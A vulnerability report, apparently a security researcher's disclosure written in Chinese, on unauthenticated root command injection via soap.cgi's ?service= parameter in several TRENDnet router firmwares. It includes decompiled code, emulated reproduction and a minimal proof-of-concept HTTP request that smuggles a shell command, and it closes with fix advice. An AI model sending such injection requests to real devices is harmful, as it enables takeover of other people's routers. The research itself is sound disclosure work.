@@ -1,0 +1,254 @@
+A1 — soap.cgi?service= 未认证命令注入（TRENDnet TEW-751DR 1.03B01 / TEW-752DRU 1.03B01）
+=========================================================================================
+结论编号: C-1 (TEW-751DR 1.03B01) / C-2 (TEW-752DRU 1.03B01)
+证据类型: 静态链（反编译）+ 本机仿真动态复现（chroot + qemu-user, MIPSEL）
+定级: High / CVSS 3.1 8.8 (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+      如果 UPnP 控制面在 WAN 侧可达则升为 9.8 (AV:N)；见 §7 未证实项。
+记录时间: 2026-10-30 (Asia/Shanghai)
+
+-----------------------------------------------------------------------------------------
+0. 一句话
+-----------------------------------------------------------------------------------------
+固件自带的 UPnP IGD 控制端点 `soap.cgi` 把 URL 查询串里 `?service=` 之后的内容**原样**
+拼进 `system()` 的命令行，全流程没有任何认证、没有转义。攻击者只要能从能访问
+UPnP 控制面的网络位置发一个 POST（Content-Type: text/xml + 带 `#` 的 SOAPAction），
+就能以 root（httpd 以 root 运行）执行任意命令。
+
+-----------------------------------------------------------------------------------------
+1. 材料与 provenance（可复核）
+-----------------------------------------------------------------------------------------
+M-1  TEW-751DR  v1.03B01
+     文件: TEW751DR_FW103B01.bin
+     来源: https://download.trendnet.com/TEW-751DR/firmware/TEW-751DRv1_(FW1.03B01).zip
+     目录索引: https://download.trendnet.com/TEW-751DR/firmware/  (HTTP 200, 可直接列目录)
+     sha256: fe1168fc2b2bf4744df3a7145eeaf11b2c5272ae502c8f2993e5c614499322ec
+
+M-2  TEW-752DRU  v1.03B01
+     文件: TEW752DRU_FW103B01.bin
+     来源: https://download.trendnet.com/TEW-752DRU/firmware/TEW-752DRUv1_(FW1.03B01).zip
+     sha256: facbd373af3568a064e34f1a1b74f2840bd7fd5b6f3e54fe7fdcc66f7779c41a
+
+以上两份都是厂商官方下载站直链，未经过第三方镜像。
+
+-----------------------------------------------------------------------------------------
+2. 解包链（P1）
+-----------------------------------------------------------------------------------------
+两个镜像同构：厂商裸镜像 = 0 填充 + squashfs 4.0（compression id=2 / lzma）。
+差别只在压缩块头：**没有** 标准 LZMA_ALONE 的 8 字节未压缩长度字段，改成
+`props(1) + dict_size(4) + 裸 LZMA1 流`。结果就是 unsquashfs 4.6.1 / sasquatch / binwalk
+全部解不开（unsquashfs 报 "Corrupt input data" 或直接段错误）。
+
+  TEW-751DR  裸镜像 7.5MB → carve @0x1501D0 → squashfs 4.0 (lzma)
+             sha256(squashfs) = b36da69f1de2ff6ad342e6fea6fb9c0c53cf09a5a553a24a1e4c463beab8bbe0
+             inode 1878 / 1530 个文件 + 163 个符号链接 + 110 个目录
+  TEW-752DRU 同链，rootfs 1513 个文件
+
+工具: `python3 tools/fw/auto_unpack.py <image> -o <dir>`
+      unsquashfs 失败后自动回退到 `tools/fw/squashfs.py` 的纯 Python 读取器
+      （本轮为此新增 `_lzma_short_header()` 与 `extract` 子命令）。
+      751DR: 2.0s 解完；752DRU: 同。
+
+-----------------------------------------------------------------------------------------
+3. 静态链（TEW-751DR，cgibin sha256 e27547940d0ae75233fc6b2b64c50d37fc3b55d4dea9d86bbb86dd448f08a7eb）
+-----------------------------------------------------------------------------------------
+3.1 入口点存在性
+    /htdocs/cgibin 是 MIPS32 LE / uClibc 的多路复用 CGI 二进制，main() 按
+    `basename(argv[0])` 分发；`"soap.cgi"` → `soapcgi_main`。
+    （反编译证据: cgibin.DecompileFn.main.txt，strcmp 表里 "soap.cgi" 分支；
+      同一张表还有 "soap.cgi"/"gena.cgi"/"ssdpcgi"）
+
+    soap.cgi 不是镜像里现成的文件，而是启动时由
+    `etc/services/HTTP/httpsvcs.php:134-135` 现建的符号链接：
+        startcmd("ln -s /htdocs/cgibin ".$vdir."/soap.cgi");
+        startcmd("ln -s /htdocs/cgibin ".$vdir."/gena.cgi");
+    $vdir = /var/htdocs/upnp（`htdocs/upnp/docs` 是指向 /var/htdocs/upnp 的符号链接）。
+    UPnP 服务端由 `etc/services/HTTP/httpcfg.php:266` 的 `upnp_server()` 生成配置段，
+    端口取自 `etc/defnodes/S90upnpigd.php:34  set("port","49152")`。
+
+3.2 关键代码（soapcgi_main @ 0x40e2b0，Ghidra 12.2 反编译，原文摘录）
+    iVar3 = getenv("REQUEST_METHOD");            /* POST 或 GET 都收 */
+    iVar4 = getenv("CONTENT_TYPE");             /* 必须是 text/xml 开头 */
+    iVar5 = getenv("REQUEST_URI");
+    pcVar6 = getenv("HTTP_SOAPACTION");         /* 必须含 '#' */
+    ...
+    iVar4 = strchr(iVar5, '?');
+    if (iVar4 != 0) {
+      if (strncmp(iVar4, "?service=", 9) != 0) goto fail;
+      ...
+      param3 = (char *)(iVar4 + 9);             /* ← service 值，未做任何过滤 */
+      sprintf(&DAT_00434c60,
+              "%s/ACTION.%s.php\nACTION_NODEBASE=%s\nINF_UID=%s\nSERVICE_TYPE=%s\n"
+              "ACTION_NAME=%s\nSHELL_FILE=%s/%s_%d.sh",
+              "/htdocs/upnp", param3, "/runtime/services/upnp", SERVER_ID,
+              pcVar6, pcVar8, "/var/run", param3, getpid());
+      iVar4 = xmldbc_ephp_wb(0, 0, &DAT_00434c60, &DAT_00433c60, 0x1000);
+      if (iVar4 == 0) {
+        ...
+        sprintf(&DAT_00434c60, "%s/%s_%d.sh", "/var/run", param3, getpid());
+        param0 = fopen(&DAT_00434c60, "w");
+        if (param0 != 0) {
+          fprintf(param0, "rm -f %s/%s_%d.sh", "/var/run", param3, getpid());
+          fclose(param0);
+          sprintf(&DAT_00434c60, "sh %s/%s_%d.sh > /dev/console &",
+                  "/var/run", param3, getpid());
+          system(&DAT_00434c60);                /* ← 命令注入点 */
+        }
+      }
+    }
+
+    只读的判定条件（按顺序）：
+      a) REQUEST_METHOD ∈ {POST, GET}（strcasecmp；否则 501）
+      b) CONTENT_TYPE 以 "text/xml" 开头（strncasecmp 8；否则 415）
+      c) REQUEST_URI 含 '?' 且前缀恰好是 "?service="
+      d) HTTP_SOAPACTION 含 '#'（否则整段跳过）
+      e) 再次 strcasecmp(REQUEST_METHOD,"POST")==0 —— 走到注入点必须是 POST
+      f) xmldbc_ephp_wb() 返回 0，即能连上 phpserver 的 AF_UNIX socket
+         `/var/run/xmldb_sock` 并写出请求（见 §3.4：只要求"连上并写完"，
+         不要求 ACTION.*.php 真实存在，也不看返回内容）
+
+3.3 认证面：没有
+    soapcgi_main 开头唯一的"守卫"是 `FUN_0040e0a4()`：
+        open("/var/run/soap.lock", O_WRONLY|O_CREAT, 0644)
+        lseek/lockf(fd, F_TLOCK, 1)  ← 只是并发互斥的文件锁
+    返回 -1 时直接 return 0（拿不到锁就不干活）。
+    函数里**任何**会话/口令/HNAP/token 检查都不存在；也没有调用
+    sess_ispoweruser()/sess_get_uid()（对比同二进制里 pigwidgeoncgi_main 有）。
+
+3.4 xmldbc_ephp_wb 的判据（0x411fe4）
+    iVar2 = FUN_0041181c();              /* AF_UNIX connect("/var/run/xmldb_sock") */
+    if (iVar2 >= 0) {
+      iVar3 = FUN_00411900(iVar2, 10, 0, param_3, strlen(param_3)+1);  /* send */
+      if (iVar3 >= 0) { FUN_00411eb0(iVar2, param_4, param_5); uVar4 = 0; }
+      close(iVar2);
+    }
+    → 返回 0 只代表"连上并写成功"。payload 里带 `;` 让
+      /htdocs/upnp/ACTION.<payload>.php 不存在，也不影响返回值。
+
+-----------------------------------------------------------------------------------------
+4. 动态复现（本机仿真，MIPS32 LE）
+-----------------------------------------------------------------------------------------
+环境: WSL2 Ubuntu，qemu-user（binfmt_misc 注册 qemu-mipsel + `chroot` 进解包出的
+      rootfs），root 权限；固件自带 /bin/busybox（静态 MIPS）因此 system() 里的
+      `/bin/sh -c` 是真跑固件自己的 shell。
+说明: 设备上的 phpserver 在本机跑不起来（缺它的依赖），因此用一个只 listen +
+      回一行 HTTP 的 AF_UNIX 监听器顶替 /var/run/xmldb_sock。它只决定
+      "能不能往下走"，**不参与**命令字符串的拼接；命令里出现的每个字节都来自
+      ?service= 的取值。
+
+4.1 TEW-751DR 1.03B01
+    $ R=<rootfs>/rootfs
+    $ cp /usr/bin/qemu-mipsel-static $R/ ; mkdir -p $R/var/run $R/var/htdocs/upnp
+    $ ln -s /htdocs/cgibin $R/var/htdocs/upnp/soap.cgi
+    $ python3 fakephp.py $R/var/run/xmldb_sock &          # 只 listen/回一行
+    $ chroot $R /bin/sh -c 'cd /; PAYLOAD="OSInfo1;echo INJECTED_MARKER>pwned;";
+        REQUEST_METHOD=POST \
+        REQUEST_URI="/soap.cgi?service=$PAYLOAD" \
+        HTTP_SOAPACTION="urn:schemas-upnp-org:service:OSInfo:1#GetInfo" \
+        CONTENT_TYPE=text/xml SERVER_ID=1234 \
+        GATEWAY_INTERFACE=CGI/1.1 SERVER_PROTOCOL=HTTP/1.1 \
+        REMOTE_ADDR=127.0.0.1 REMOTE_PORT=5555 \
+        /var/htdocs/upnp/soap.cgi < /dev/null'
+
+    实际输出（原样）:
+        /var/run/OSInfo1: can't open
+        _455187.sh: not found
+        HTTP/1.1 200 OK
+        CONTENT-LENGTH: 0
+        exit=0
+    system() 拿到的命令行被 shell 按 `;` 切开，三段分别是
+      `sh /var/run/OSInfo1` / `echo INJECTED_MARKER>pwned` / `_455187.sh`。
+    落盘结果:
+        $ ls -la $R/pwned
+        -rw-r--r-- 1 root root 16 ... <rootfs>/rootfs/pwned
+        $ cat $R/pwned
+        INJECTED_MARKER
+
+4.2 对照（同一环境、同一请求，只换 service 取值）
+    service=OSInfo1 （无元字符）:
+        HTTP/1.1 200 OK / CONTENT-LENGTH: 0，rootfs 里不产生 pwned 文件；
+        /var/run/OSInfo1_<pid>.sh 被写出后由脚本自己的 `rm -f` 删掉（自清理，属正常机制）。
+    service=OSInfo1;echo INJECTED_MARKER>pwned; → 产生 pwned，内容 INJECTED_MARKER。
+    → 差异只来自 service 取值，注入成立。
+
+4.3 TEW-752DRU 1.03B01（同样流程，payload 改 pwned752）
+    输出:
+        /var/run/OSInfo1: can't open
+        _456755.sh: not found
+        HTTP/1.1 200 OK
+        CONTENT-LENGTH: 0
+        exit=0
+    落盘: <rootfs>/rootfs/pwned752 = INJECTED_752 (13 字节)
+    两个型号的 cgibin 不是同一个文件（md5 6b326314… vs 335299e2…），但都含
+    同一段 `sh %s/%s_%d.sh > /dev/console &` + `?service=` 代码。
+
+4.4 TEW-733GR 1.03B01（第三个受影响型号；cgibin 与 751DR **逐字节相同**）
+
+    材料: https://download.trendnet.com/TEW-733GR/firmware/TEW-733GRv1_(FW1.03B01).zip
+          镜像 TEW733GR_FW103B01.bin
+          sha256 6a7b982ce6a711bfaefc5e903149f0f697a821453a275a6782fb3382510ba54a
+    解包: 厂商裸镜像 carve -> squashfs 4.0(lzma 短头) -> `auto_unpack.py` 7.5s，111 条根目录项
+
+    同一性（不是"同 SDK 推断"，是同一个文件）：
+        sha256(htdocs/cgibin) 733GR = e27547940d0ae75233fc6b2b64c50d37fc3b55d4dea9d86bbb86dd448f08a7eb
+        sha256(htdocs/cgibin) 751DR = e27547940d0ae75233fc6b2b64c50d37fc3b55d4dea9d86bbb86dd448f08a7eb
+        （752DRU 的是 b4f043107e2e375c…，与这两个**不同**，所以 752 单独做了动态测试，见 §4.3）
+
+    动态复现（同一套 chroot+qemu-user，payload 换 pwned733）:
+        $ tools/fw/chroot_cgi.sh <rootfs>/rootfs soap.cgi \
+            'REQUEST_URI=/soap.cgi?service=OSInfo1;echo INJECTED_733>pwned733;' FAKE_XMLDBC=1
+        /var/run/OSInfo1: can't open
+        _473194.sh: not found
+        HTTP/1.1 200 OK
+        CONTENT-LENGTH: 0
+        [i] --- 退出码 0 ---
+        $ cat <rootfs>/rootfs/pwned733
+        INJECTED_733
+
+    这条和 §4.1/§4.3 的区别：751DR、733GR 的 cgibin 是同一份二进制，752DRU 是另一份
+    但含同一段代码。三个型号各自都在本机跑出过注入落盘，不是从一条推出来的。
+
+-----------------------------------------------------------------------------------------
+5. 影响
+-----------------------------------------------------------------------------------------
+* 未认证远程命令执行，权限 = httpd 进程身份（固件里 httpd 以 root 起）。
+* 不需要任何口令/会话/HNAP 登录，不需要知道设备型号或 UUID。
+* 破坏面：改 nvram/防火墙、开 telnetd、改 admin 口令、植入固件、当跳板。
+* trigger 条件都能被攻击者完全控制（POST + text/xml + 带 # 的 SOAPAction 都是
+  UPnP 客户端的正常请求形态，不是异常请求）。
+
+-----------------------------------------------------------------------------------------
+6. 复现脚本（最小）
+-----------------------------------------------------------------------------------------
+    POST /soap.cgi?service=OSInfo1;echo%20PWN>pwn; HTTP/1.1
+    Host: 192.168.10.1:49152
+    Content-Type: text/xml
+    SOAPAction: "urn:schemas-upnp-org:service:OSInfo:1#GetInfo"
+    Content-Length: 0
+
+  注: 真实设备上 ACTION.OSInfo1.php 是不存在的（镜像里只有 ACTION.OSInfo1.php？
+      见下），但 §3.4 已说明这**不**影响是否继续；服务类型串本身只是拼接素材。
+      镜像内 /var/htdocs/upnp 下实有 ACTION.{L3Forwarding1,OSInfo1,WANCommonIFC1,
+      WANEthLinkC1,WANIPConn1,WFAWLANConfig1}.php —— 说明 `service` 的合法取值
+      是这些名字，而代码并不校验它是否属于这个集合。
+
+-----------------------------------------------------------------------------------------
+7. 边界（没证实的，不许当成已证实）
+-----------------------------------------------------------------------------------------
+* **WAN 侧可达性未证实**。已证实的是：soap.cgi 由 UPnP HTTP 服务（49152/tcp，
+  `httpcfg.php` 的 upnp_server 段）暴露，不需要认证。UPnP 是否只绑在 LAN 口、
+  出厂是否默认 enable（`S90upnpigd.php` 的 enable/ifname 取决于运行时配置）——
+  本轮**没有**在真机上验证，也没有跑真 httpd + 真 phpserver。
+  因此定级取 AV:A（相邻网络），不给 AV:N。
+* 动态复现里 phpserver 用替身；真机上 phpserver 常驻（web UI 全靠它），
+  但"常驻"这一点来自 init 脚本阅读，不是本轮实测。
+* 只验证了 1.03B01 两个型号。1.03B03 / 1.00B11 / 1.01B01 未跑（有镜像，未测）。
+* 没有做真实网络发包（scope 只允许本机仿真），所有请求都是直接喂给 CGI 的
+  CGI 环境变量，等价于 httpd 转发后的形态。
+
+-----------------------------------------------------------------------------------------
+8. 谁该修
+-----------------------------------------------------------------------------------------
+`service` 只应该当"枚举值"处理：比对白名单（ACTION.<name>.php 必须存在）后
+再拼路径；`system()` 那一段应当直接用 argv 数组 exec，不要把用户输入拼进 shell。
+同一份代码在 gena.cgi 的 SUBSCRIBE/UNSUBSCRIBE 分支还传了一次 service
+（FUN_0040e740/FUN_0040eb2c），同一处根因需要一起看。
